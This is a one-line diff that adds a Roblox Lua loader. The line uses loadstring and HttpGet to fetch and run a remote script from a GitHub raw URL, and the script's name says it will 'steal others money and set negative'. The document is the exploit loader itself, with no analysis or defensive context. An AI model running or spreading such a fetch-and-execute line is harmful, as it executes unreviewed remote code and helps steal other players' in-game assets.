@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cnzins1/scripts/main/steal%20others%20money%20and%20set%20negative"))()
